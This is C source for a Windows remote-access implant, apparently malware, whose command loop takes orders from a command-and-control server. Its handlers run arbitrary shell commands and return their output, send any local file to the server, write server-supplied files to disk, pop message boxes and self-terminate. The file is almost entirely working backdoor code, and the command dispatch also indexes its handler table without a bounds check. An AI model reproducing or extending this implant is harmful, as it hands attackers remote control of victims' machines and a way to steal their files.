#include <windows.h>
#include "cnc.h"
#include "echo.h"
#include "shell.h"
#include "msgbox.h"
#include "logger.h"
#include "file.h"
#include "commander.h"
#include "return_codes.h"

void handle_echo()
{
    int return_code = 0;
    int bytes_read = 0;
    struct echo_cmd cmd = {};

    log_info("Received ECHO command.");
    if (recvall_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    while (cmd.bytes_remaining)
    {
        bytes_read = recvall_cnc(cmd.data, min(cmd.bytes_remaining, sizeof(cmd.data)));
        if (bytes_read == 0)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
        cmd.bytes_remaining -= bytes_read;
        if (send_cnc(cmd.data, bytes_read) != bytes_read)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
    }
cleanup:
    if (return_code)
        log_error("Failed to echo the data. Error code: %d", return_code);
    else
        log_info("Successfully echod the data.");
}

void handle_shell()
{
    int return_code = 0;
    unsigned long bytes_read = 0;
    struct shell_cmd cmd = {};

    log_info("Received SHELL command.");

    if (recvall_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    if ((cmd.cmd = malloc(cmd.cmd_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }

    if (recvall_cnc(cmd.cmd, cmd.cmd_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.cmd[cmd.cmd_len] = 0;

    log_info("Command: \"%s\"", cmd.cmd);
    shell(&cmd);

    while (TRUE)
    {
        bytes_read = read_shell_output(&cmd);
        if (bytes_read != 0)
        {
            send_cnc(&bytes_read, sizeof(bytes_read));
            send_cnc(cmd.out, bytes_read);
        }
        else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
        {
            send_cnc(&bytes_read, sizeof(bytes_read));
            close_shell_process(&cmd);
            send_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
            break;
        }
    }
cleanup:
    if (return_code)
        log_error("Failed to execute the command. Error code: %d", return_code);
    else
        log_info("Successfully executed the command.");
}

void handle_msgbox()
{
    int return_code = 0;
    struct msgbox_cmd cmd = {};

    log_info("Received MSGBOX command.");

    if (recvall_cnc(&cmd.title_len, sizeof(cmd.title_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.title = malloc(cmd.title_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (recvall_cnc(cmd.title, cmd.title_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.title[cmd.title_len] = 0;

    if (recvall_cnc(&cmd.text_len, sizeof(cmd.text_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.text = malloc(cmd.text_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (recvall_cnc(cmd.text, cmd.text_len) == 0)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.text[cmd.text_len] = 0;

    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
    MessageBox(NULL, cmd.text, cmd.title, MB_OK);

cleanup:
    if (cmd.title)
        free(cmd.title);
    if (cmd.text)
        free(cmd.text);

    if (return_code)
        log_error("Failed to show the message box. Error code: %d", return_code);
    else
        log_info("Successfully showed the message box.");
}

void handle_suicide()
{
    log_info("Received SUICIDE command.");
    exit(EXIT_SUCCESS);
}

void handle_upload_file()
{
    int return_code = 0;
    unsigned long bytes_read = 0;
    HANDLE file = NULL;
    struct file_cmd cmd = {};

    log_info("Received UPLOAD_FILE command.");

    if (recvall_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.local_path = malloc(cmd.local_path_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (recvall_cnc(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.local_path[cmd.local_path_len] = 0;
    log_info("Uploading file to: %s", cmd.local_path);

    if ((file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        return_code = E_FILE_NOT_FOUND;
        goto cleanup;
    }

    if (send_cnc(&return_code, sizeof(return_code)) != sizeof(return_code))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    cmd.file_size = GetFileSize(file, NULL);
    if (send_cnc(&cmd.file_size, sizeof(cmd.file_size)) != sizeof(cmd.file_size))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    while (TRUE)
    {
        if (!ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL))
        {
            return_code = E_FILE_READ_ERROR;
            goto cleanup;
        }
        if (bytes_read == 0)
            break;

        if (send_cnc(cmd.file_chunk, bytes_read) != bytes_read)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
    }

cleanup:
    if (cmd.local_path)
        free(cmd.local_path);
    if (file)
        CloseHandle(file);

    if (return_code)
        log_error("Failed to upload the file. Error code: %d", return_code);
    else
        log_info("Successfully uploaded the file.");
}

void handle_download_file()
{
    int return_code = 0;
    int bytes_read = 0;
    unsigned long long written_file_bytes = 0;
    HANDLE file = NULL;
    struct file_cmd cmd = {};

    log_info("Received DOWNLOAD_FILE command.");

    if (recvall_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.local_path = malloc(cmd.local_path_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (recvall_cnc(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.local_path[cmd.local_path_len] = 0;
    log_info("Downloading file to: %s", cmd.local_path);

    if ((file = CreateFile(cmd.local_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        return_code = E_FILE_CREATE_ERROR;
        goto cleanup;
    }

    if (send_cnc(&return_code, sizeof(return_code)) != sizeof(return_code))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    if (recvall_cnc(&cmd.file_size, sizeof(cmd.file_size)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    while (TRUE)
    {
        if ((bytes_read = recvall_cnc(cmd.file_chunk, min(cmd.file_size - written_file_bytes, sizeof(cmd.file_chunk)))) == E_CONNECTION_CLOSED)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
        written_file_bytes += bytes_read;

        if (!WriteFile(file, cmd.file_chunk, bytes_read, NULL, NULL))
        {
            return_code = E_FILE_WRITE_ERROR;
            goto cleanup;
        }

        if (written_file_bytes == cmd.file_size)
            break;
    }

cleanup:
    if (cmd.local_path)
        free(cmd.local_path);
    if (file)
        CloseHandle(file);

    if (return_code)
        log_error("Failed to download the file. Error code: %d", return_code);
    else
        log_info("Successfully downloaded the file.");
}

void listen_for_cmds()
{
    int bytes_read = 0;
    struct cmd cmd = {};
    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};

    while (TRUE)
    {
        log_info("Waiting for command.");
        if (recvall_cnc(&cmd, sizeof(struct cmd)) == E_CONNECTION_CLOSED)
        {
            log_error("Received invalid command.");
            continue;
        }
        cmd_type_handler[cmd.type]();
    }
}
